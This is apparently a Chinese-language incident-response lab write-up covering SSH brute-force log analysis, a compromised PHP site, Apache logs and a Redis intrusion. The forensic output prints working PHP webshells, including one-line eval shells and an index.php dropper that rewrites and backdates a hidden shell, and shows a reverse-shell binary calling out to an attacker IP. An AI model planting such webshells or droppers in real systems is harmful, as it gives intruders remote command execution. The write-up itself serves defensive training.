</span></span></code></pre></div><p>同Q1</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:/var/log# cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Accepted &#34;</span> | awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>2</span> 192.168.200.2
</span></span></code></pre></div><pre tabindex=0><code>flag{192.168.200.2}
</code></pre><h2 id=q3-1>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Failed password&#34;</span> |perl -e <span style=color:#e6db74>&#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;</span>|uniq -c|sort -nr
</span></span></code></pre></div><p>使用 <code>perl</code> 提取源 IP 地址<code>while($_=&lt;>){}</code>：读取每一行日志</p><p><code>/for(.*?) from/</code>：正则表达式匹配 &ldquo;for&rdquo; 和 &ldquo;from&rdquo; 之间的内容（即源 IP 地址）。</p><p><code>print "$1\n"</code>：输出匹配到的 IP 地址</p><pre tabindex=0><code>root@ip-10-0-10-1:/var/log# cat auth.log.1 | grep -a &#34;Failed password&#34; |perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &#34;$1\n&#34;;}&#39;|uniq -c|sort -nr
      5  invalid user user
      5  invalid user hello
      5  invalid user 
      4  root
      1  root
      1  root
      1  invalid user test3
      1  invalid user test2
      1  invalid user test1
</code></pre><pre tabindex=0><code>flag{user,hello,root,test3,test2,test1}
</code></pre><h2 id=q4-1>Q4</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat auth.log.1 | grep -a <span style=color:#e6db74>&#34;Failed password for root&#34;</span> | awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | sort | uniq -c | sort -nr | more
</span></span></code></pre></div><pre tabindex=0><code>4
</code></pre><h2 id=q5>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-1:/var/log# cat auth.log.1 |grep -a <span style=color:#e6db74>&#34;new user&#34;</span>
</span></span><span style=display:flex><span>Aug  <span style=color:#ae81ff>1</span> 07:50:45 linux-rz useradd<span style=color:#f92672>[</span>7551<span style=color:#f92672>]</span>: new user: name<span style=color:#f92672>=</span>test2, UID<span style=color:#f92672>=</span>1000, GID<span style=color:#f92672>=</span>1000, home<span style=color:#f92672>=</span>/home/test2, shell<span style=color:#f92672>=</span>/bin/sh
</span></span><span style=display:flex><span>Aug  <span style=color:#ae81ff>1</span> 08:18:27 ip-172-31-37-190 useradd<span style=color:#f92672>[</span>487<span style=color:#f92672>]</span>: new user: name<span style=color:#f92672>=</span>debian, UID<span style=color:#f92672>=</span>1001, GID<span style=color:#f92672>=</span>1001, home<span style=color:#f92672>=</span>/home/debian, shell<span style=color:#f92672>=</span>/bin/bash
</span></span></code></pre></div><p>还是感叹一下peterpan师傅，在上学的最后一年给全网留下了一份比较完善详细的玄机靶场的wp</p><h1 id=第一章-应急响应--linux入侵排查>第一章 应急响应- Linux入侵排查</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1.web目录存在木马，请找到木马的密码提交
</span></span><span style=display:flex><span>2.服务器疑似存在不死马，请找到不死马的密码提交
</span></span><span style=display:flex><span>3.不死马是通过哪个文件生成的，请提交文件名
</span></span><span style=display:flex><span>4.黑客留下了木马文件，请找出黑客的服务器ip提交
</span></span><span style=display:flex><span>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交
</span></span></code></pre></div><h2 id=q1-2>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-7:~# find / -name <span style=color:#e6db74>&#34;*.php&#34;</span> -type f -exec grep -Hn <span style=color:#e6db74>&#34;eval(&#34;</span> <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> 2&gt;/dev/null
</span></span><span style=display:flex><span>/var/www/html/.shell.php:1:&lt;?php <span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>md5<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span><span style=color:#e6db74>&#34;pass&#34;</span><span style=color:#f92672>])==</span><span style=color:#e6db74>&#34;5d41402abc4b2a76b9719d911017c592&#34;</span><span style=color:#f92672>){</span>@eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span>cmd<span style=color:#f92672>])</span>;<span style=color:#f92672>}</span>?&gt;
</span></span><span style=display:flex><span>/var/www/html/index.php:17:$code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?php if(md5($_POST[&#34;pass&#34;])==&#34;5d41402abc4b2a76b9719d911017c592&#34;){@eval($_POST[cmd]);}?&gt;&#39;</span>;
</span></span><span style=display:flex><span>/var/www/html/1.php:1:&lt;?php eval<span style=color:#f92672>(</span>$_POST<span style=color:#f92672>[</span>1<span style=color:#f92672>])</span>;?&gt;
</span></span></code></pre></div><pre tabindex=0><code>flag{1}
</code></pre><h2 id=q2-2>Q2</h2><pre tabindex=0><code>5d41402abc4b2a76b9719d911017c592
hello
</code></pre><h2 id=q3-2>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-7:~# cat /var/www/html/index.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>include<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;config.php&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>include<span style=color:#f92672>(</span>SYS_ROOT.INC.<span style=color:#e6db74>&#39;common.php&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$path<span style=color:#f92672>=</span>$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;PATH_INFO&#39;</span><span style=color:#f92672>]</span>.<span style=color:#f92672>(</span>$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;QUERY_STRING&#39;</span><span style=color:#f92672>]</span>?<span style=color:#e6db74>&#39;?&#39;</span>.str_replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;?&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>,$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;QUERY_STRING&#39;</span><span style=color:#f92672>])</span>:<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>substr<span style=color:#f92672>(</span>$path, 0,1<span style=color:#f92672>)==</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        $path<span style=color:#f92672>=</span>substr<span style=color:#f92672>(</span>$path,1<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$path <span style=color:#f92672>=</span> Base::safeword<span style=color:#f92672>(</span>$path<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>$ctrl<span style=color:#f92672>=</span>isset<span style=color:#f92672>(</span>$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;action&#39;</span><span style=color:#f92672>])</span>?$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;action&#39;</span><span style=color:#f92672>]</span>:<span style=color:#e6db74>&#39;run&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>isset<span style=color:#f92672>(</span>$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;createprocess&#39;</span><span style=color:#f92672>]))</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        Index::createhtml<span style=color:#f92672>(</span>isset<span style=color:#f92672>(</span>$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;id&#39;</span><span style=color:#f92672>])</span>?$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;id&#39;</span><span style=color:#f92672>]</span>:0,$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cat&#39;</span><span style=color:#f92672>]</span>,$_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;single&#39;</span><span style=color:#f92672>])</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span><span style=color:#66d9ef>else</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        Index::run<span style=color:#f92672>(</span>$path<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/var/www/html/.shell.php&#39;</span>;
</span></span><span style=display:flex><span>$code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?php if(md5($_POST[&#34;pass&#34;])==&#34;5d41402abc4b2a76b9719d911017c592&#34;){@eval($_POST[cmd]);}?&gt;&#39;</span>;
</span></span><span style=display:flex><span>file_put_contents<span style=color:#f92672>(</span>$file, $code<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;touch -m -d &#34;2021-01-01 00:00:01&#34; .shell.php&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>usleep<span style=color:#f92672>(</span>3000<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>?&gt;
</span></span></code></pre></div><pre tabindex=0><code>flag{index.php}
</code></pre><h2 id=q4-2>Q4</h2><p>先查找一下有无暴力痕迹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>grep <span style=color:#e6db74>&#34;shell.php&#34;</span> /var/log/auth.log.1
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat auth.log.1 |grep <span style=color:#e6db74>&#34;Accepted password&#34;</span>
</span></span></code></pre></div><p>去看一下有无文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-7:~# cd /var/www/html/
</span></span><span style=display:flex><span>root@ip-10-0-10-7:/var/www/html# ls
</span></span><span style=display:flex><span> 1.php   admin     config.php   favicon.ico   index.php     LICENSE    README.md  <span style=color:#e6db74>&#39;shell(1).elf&#39;</span>   template
</span></span><span style=display:flex><span> 1.tar   api.php   data         include       install.php   pictures   rss.php     sitemap.php     wap
</span></span></code></pre></div><p>提权运行一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-7:/var/www/html# chmod <span style=color:#ae81ff>777</span> <span style=color:#e6db74>&#34;shell(1).elf&#34;</span>
</span></span><span style=display:flex><span>root@ip-10-0-10-7:/var/www/html# 
</span></span><span style=display:flex><span>root@ip-10-0-10-7:/var/www/html# ./<span style=color:#e6db74>&#39;shell(1).elf&#39;</span>
</span></span></code></pre></div><p>再开一个</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Last login: Mon Mar  <span style=color:#ae81ff>3</span> 12:51:04 <span style=color:#ae81ff>2025</span> from 58.218.234.99
</span></span><span style=display:flex><span>root@ip-10-0-10-7:~# netstat -antlp | more
</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>servers and established<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      571/mysqld          
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      507/sshd            
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 10.0.10.7:22            58.218.234.99:41753     ESTABLISHED 619/sshd: root@pts/ 
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>68</span> 10.0.10.7:22            58.218.234.99:50301     ESTABLISHED 1034/sshd: root@pts 
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>1</span> 10.0.10.7:44194         10.11.55.21:3333        SYN_SENT    1051/./shell<span style=color:#f92672>(</span>1<span style=color:#f92672>)</span>.elf 
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::80                   :::*                    LISTEN      631/apache2         
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::22                   :::*                    LISTEN      507/sshd      
</span></span></code></pre></div><p>显示系统当前的网络连接状态，包括监听端口等信息，并使用 <code>more</code> 分页查看输出结果。参数含义如下：</p><ul><li><code>-a</code>：显示所有套接字，包括监听和非监听状态。</li><li><code>-n</code>：以数字形式显示地址和端口，而不是尝试解析主机名。</li><li><code>-t</code>：仅显示 TCP 连接。</li><li><code>-l</code>：仅显示正在监听的套接字。</li><li><code>-p</code>：显示所属进程的 PID 和进程名。</li><li><code>| more</code>：分页查看输出，适合结果过长时阅读。</li></ul><pre tabindex=0><code>10.11.55.21
</code></pre><h2 id=q5-1>Q5</h2><pre tabindex=0><code>3333
</code></pre><h1 id=第二章日志分析-apache日志分析>第二章日志分析-apache日志分析</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>1、提交当天访问次数最多的IP，即黑客IP：
</span></span><span style=display:flex><span>2、黑客使用的浏览器指纹是什么，提交指纹的md5：
</span></span><span style=display:flex><span>3、查看包含index.php页面被访问的次数，提交次数：
</span></span><span style=display:flex><span>4、查看黑客IP访问了多少次，提交次数：
</span></span><span style=display:flex><span>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:
</span></span></code></pre></div><h2 id=q1-3>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat access.log.1 | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | sort | uniq -c | sort -nr | head -n <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | sort | uniq -c | sort -nr | head -n <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>6555</span> 192.168.200.2
</span></span></code></pre></div><h2 id=q2-3>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat access.log.1 |grep 192.168.200.2 |more
</span></span></code></pre></div><pre tabindex=0><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
2D6330F380F44AC20F3A02EED0958F66
</code></pre><h2 id=q3-3>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-5:/var/log/apache2# grep <span style=color:#e6db74>&#34;/index.php&#34;</span> access.log.1 | wc -l
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>
</span></span></code></pre></div><h2 id=q4-3>Q4</h2><p>同Q1</p><pre tabindex=0><code>6555
</code></pre><h2 id=q5-2>Q5</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-5:/var/log/apache2# grep <span style=color:#e6db74>&#34;03/Aug/2023:08:&#34;</span> access.log.1 | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | sort | uniq | wc -l 
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>
</span></span></code></pre></div><h1 id=第二章日志分析-redis应急响应>第二章日志分析-redis应急响应</h1><pre tabindex=0><code>通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;
通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;
通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;
通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交
通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;
</code></pre><h2 id=q1-4>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:/var/log# cat redis.log
</span></span><span style=display:flex><span>5417:C <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:11:00.391 <span style=color:#75715e># oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span>
</span></span><span style=display:flex><span>5417:C <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:11:00.391 <span style=color:#75715e># Redis version=5.0.1, bits=64, commit=00000000, modified=0, pid=5417, just started</span>
</span></span><span style=display:flex><span>5417:C <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:11:00.391 <span style=color:#75715e># Configuration loaded</span>
</span></span><span style=display:flex><span>5417:M <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:11:00.392 * Increased maximum number of open files to <span style=color:#ae81ff>10032</span> <span style=color:#f92672>(</span>it was originally set to 1024<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>                _._                                                  
</span></span><span style=display:flex><span>           _.-<span style=color:#e6db74>``</span>__ <span style=color:#e6db74>&#39;&#39;</span>-._                                             
</span></span><span style=display:flex><span>      _.-<span style=color:#e6db74>``</span>    <span style=color:#e6db74>`</span>.  <span style=color:#e6db74>`</span>_.  <span style=color:#e6db74>&#39;&#39;</span>-._           Redis 5.0.1 <span style=color:#f92672>(</span>00000000/0<span style=color:#f92672>)</span> <span style=color:#ae81ff>64</span> bit
</span></span><span style=display:flex><span>  .-<span style=color:#e6db74>``</span> .-<span style=color:#e6db74>```</span>.  <span style=color:#e6db74>```</span><span style=color:#ae81ff>\/</span>    _.,_ <span style=color:#e6db74>&#39;&#39;</span>-._                                   
</span></span></code></pre></div><p>redis版本是5.0.1，而redis的未授权访问漏洞的影响范围是在Redis &lt;=5.0.5</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:/etc/redis# cat redis.conf |grep <span style=color:#e6db74>&#34;require&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># If the master is password protected (using the &#34;requirepass&#34; configuration</span>
</span></span><span style=display:flex><span><span style=color:#75715e># For example to require at least 3 replicas with a lag &lt;= 10 seconds use:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># requirepass foobared</span>
</span></span></code></pre></div><p>这条配置是被注释掉的（前面的 <code>#</code> 号表示注释）。这意味着<strong>Redis 没有设置密码保护</strong>，任何能访问这个 Redis 服务器的用户都可以直接执行命令。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /var/log/redis.log
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:27.636 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:28.637 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:28.637 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:28.638 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:29.639 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:29.639 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:29.640 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:30.641 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:30.641 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:30.642 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:31.643 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:31.643 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:31.644 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:32.644 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:32.645 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:32.645 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:33.647 * Connecting to MASTER 192.168.100.13:8888
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:33.647 * MASTER &lt;-&gt; REPLICA sync started
</span></span><span style=display:flex><span>419:S <span style=color:#ae81ff>31</span> Jul <span style=color:#ae81ff>2023</span> 05:33:33.648 <span style=color:#75715e># Error condition on socket for SYNC: Connection refused</span>
</span></span></code></pre></div><p>会发现很多重复的,但是不是这题答案</p><pre tabindex=0><code>flag{192.168.100.20}
</code></pre><p>一个一个试</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:~# cat /var/log/redis.log | grep -oP <span style=color:#e6db74>&#39;(?&lt;=Connecting to MASTER )[\d\.]+(?=:\d+)&#39;</span> | sort | uniq -c | sort -nr
</span></span><span style=display:flex><span>     <span style=color:#ae81ff>48</span> 192.168.100.13
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>2</span> 192.168.100.20
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>1</span> 192.168.31.55
</span></span></code></pre></div><h2 id=q2-4>Q2</h2><p>直接找恶意文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:~# ls / -al
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>120</span>
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>18</span> root root  <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>4</span> 12:32 .
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>18</span> root root  <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>4</span> 12:32 ..
</span></span><span style=display:flex><span>lrwxrwxrwx   <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>7</span> Nov <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2022</span> bin -&gt; usr/bin
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#ae81ff>4</span> root root  <span style=color:#ae81ff>4096</span> Nov <span style=color:#ae81ff>18</span>  <span style=color:#ae81ff>2022</span> boot
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>14</span> root root  <span style=color:#ae81ff>2780</span> Mar  <span style=color:#ae81ff>4</span> 12:32 dev
</span></span><span style=display:flex><span>-rw-r--r--   <span style=color:#ae81ff>1</span> root root    <span style=color:#ae81ff>92</span> Aug  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2023</span> dump.rdb
</span></span><span style=display:flex><span>drwxr-xr-x  <span style=color:#ae81ff>73</span> root root  <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>4</span> 12:32 etc
</span></span><span style=display:flex><span>-rw-r--r--   <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>48040</span> Jul <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2023</span> exp.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:~# strings /exp.so |grep <span style=color:#e6db74>&#34;flag&#34;</span>
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b<span style=color:#f92672>}</span>
</span></span></code></pre></div><h2 id=q3-4>Q3</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@ip-10-0-10-9:~# crontab -l
</span></span><span style=display:flex><span><span style=color:#75715e># Edit this file to introduce tasks to be run by cron.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Each task to run has to be defined through a single line</span>
</span></span><span style=display:flex><span><span style=color:#75715e># indicating with different fields when the task will be run</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and what command to run for the task</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># To define the time you can provide concrete values for</span>
</span></span><span style=display:flex><span><span style=color:#75715e># minute (m), hour (h), day of month (dom), month (mon),</span>
</span></span><span style=display:flex><span><span style=color:#75715e># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Notice that tasks will be started based on the cron&#39;s system</span>
</span></span><span style=display:flex><span><span style=color:#75715e># daemon&#39;s notion of time and timezones.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># </span>
